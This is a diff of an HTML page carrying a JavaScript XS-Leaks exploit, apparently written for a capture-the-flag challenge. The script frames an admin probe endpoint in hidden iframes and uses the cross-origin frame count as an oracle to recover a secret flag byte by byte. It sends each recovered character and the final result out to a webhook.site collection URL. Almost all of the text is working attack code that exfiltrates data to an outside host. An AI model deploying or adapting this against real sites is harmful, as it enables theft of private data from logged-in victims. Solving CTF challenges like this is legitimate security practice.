@@ -4,69 +4,87 @@
 <script>
 const hook = "https://webhook.site/77e2a612-4b4a-4c17-8c68-7f479d4b14d5";
 const base = "https://chall.com/admin/probe?data=";
+const start = parseInt(new URLSearchParams(location.search).get("from") || "0", 10) || 0;
 function ping(q){
-  try{ navigator.sendBeacon(hook+"?"+q); }catch(e){}
-  fetch(hook+"?"+q,{mode:"no-cors",cache:"no-store"}).catch(()=>{});
-  (new Image()).src = hook+"?"+q+"&i=1&t="+Date.now();
+  const u = hook + "?" + q + "&v=5&t=" + Date.now();
+  try { navigator.sendBeacon(u); } catch (e) {}
+  (new Image()).src = u + "&i=1";
 }
-ping("evt=visit&t="+Date.now());
+ping("evt=visit&from=" + start);
 function makeData(index, byte){
   const inp = new Uint8Array(21);
   inp[16] = index & 255;
   inp[20] = byte & 255;
-  let s="";
-  for (const b of inp) s += b.toString(16).padStart(2,"0");
+  let s = "";
+  for (const b of inp) s += b.toString(16).padStart(2, "0");
   return s;
 }
 function checkOne(index, byte){
-  return new Promise((resolve)=>{
+  return new Promise((resolve) => {
     const ifr = document.createElement("iframe");
-    ifr.style.cssText="position:absolute;width:1px;height:1px;left:-10px";
-    let done=false;
-    const finish=(len)=>{ if(done) return; done=true; try{ifr.remove()}catch(e){} resolve(len); };
-    ifr.onload=()=>{
-      setTimeout(()=>{
-        let len=-1;
-        try{ len = ifr.contentWindow.length; }catch(e){ len=-2; }
-        finish(len);
-      }, 700);
+    ifr.style.cssText = "position:absolute;width:4px;height:4px;left:-30px;border:0";
+    let done = false;
+    let iv = 0;
+    const finish = (n) => {
+      if (done) return;
+      done = true;
+      clearInterval(iv);
+      try { ifr.remove(); } catch (e) {}
+      resolve(n);
     };
+    const t0 = Date.now();
+    let crossAt = 0;
+    iv = setInterval(() => {
+      let cross = false;
+      try { void ifr.contentDocument; } catch (e) { cross = true; }
+      if (!cross) {
+        if (Date.now() - t0 > 12000) finish(-3);
+        return;
+      }
+      if (!crossAt) crossAt = Date.now();
+      let len = -1;
+      try { len = ifr.contentWindow.length; } catch (e) { len = -2; }
+      if (len === 1) { finish(1); return; }
+      if (Date.now() - crossAt > 1600) finish(len);
+    }, 40);
     ifr.src = base + makeData(index, byte);
     document.body.appendChild(ifr);
-    setTimeout(()=>finish(-3), 3500);
   });
 }
 async function checkBatch(index, bytes){
-  const lens = await Promise.all(bytes.map(b=>checkOne(index,b)));
-  const hit=[];
-  for(let i=0;i<bytes.length;i++) if(lens[i]===1) hit.push(bytes[i]);
-  return hit;
+  const lens = await Promise.all(bytes.map((b) => checkOne(index, b)));
+  let hit = -1;
+  for (let i = 0; i < bytes.length; i++) if (lens[i] === 1) hit = bytes[i];
+  return { hit, lens };
 }
-const alphabet=[];
-for (const c of "DH{}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") alphabet.push(c.charCodeAt(0));
-for (let b=32;b<=126;b++) if(!alphabet.includes(b)) alphabet.push(b);
-async function leakByte(index){
-  for(let i=0;i<alphabet.length;i+=6){
-    const batch=alphabet.slice(i,i+6);
-    const hit=await checkBatch(index, batch);
-    if(hit.length) return hit[0];
+const primary = [];
+for (const c of "DH{}_abcdefghijklmnopqrstuvwxyz0123456789") primary.push(c.charCodeAt(0));
+const extra = [];
+for (let b = 32; b <= 126; b++) if (!primary.includes(b)) extra.push(b);
+(async () => {
+  await checkOne(0, 0x58);
+  const d = await checkOne(0, 0x44);
+  const h = await checkOne(1, 0x48);
+  const x = await checkOne(0, 0x58);
+  ping("evt=probe&d=" + d + "&h=" + h + "&x=" + x + "&from=" + start);
+  const flag = [];
+  for (let i = start; i < 64; i++) {
+    let found = -1;
+    for (const alpha of [primary, extra]) {
+      for (let k = 0; k < alpha.length; k += 3) {
+        const batch = alpha.slice(k, k + 3);
+        const r = await checkBatch(i, batch);
+        if (r.hit >= 0) { found = r.hit; break; }
+      }
+      if (found >= 0) break;
+    }
+    flag.push(found);
+    const sofar = flag.map((c) => (c > 31 && c < 127) ? String.fromCharCode(c) : "?").join("");
+    ping("evt=p&i=" + i + "&b=" + found + "&s=" + encodeURIComponent(sofar));
+    if (found < 0) break;
+    if (found === 125 && (start > 0 || sofar.startsWith("DH{"))) break;
   }
-  return -1;
-}
-(async()=>{
-  const d=await checkOne(0,0x44);
-  const x=await checkOne(0,0x58);
-  ping("evt=probe&d="+d+"&x="+x);
-  const flag=[];
-  for(let i=0;i<64;i++){
-    const b=await leakByte(i);
-    flag.push(b);
-    const sofar=flag.map(c=>(c>31&&c<127)?String.fromCharCode(c):"").join("");
-    ping("evt=p&i="+i+"&b="+b+"&s="+encodeURIComponent(sofar));
-    if(b<0) break;
-    if(b===125 && sofar.startsWith("DH{")) break;
-  }
-  const final=flag.filter(c=>c>31&&c<127).map(c=>String.fromCharCode(c)).join("");
-  ping("evt=final&s="+encodeURIComponent(final));
-})().catch(e=>ping("evt=err&m="+encodeURIComponent(String(e))));
+  const final = flag.filter((c) => c > 31 && c < 127).map((c) => String.fromCharCode(c)).join("");
+  ping("evt=final&s=" + encodeURIComponent(final));
+})().catch((e) => ping("evt=err&m=" + encodeURIComponent(String(e).slice(0, 160))));
 </script></body></html>
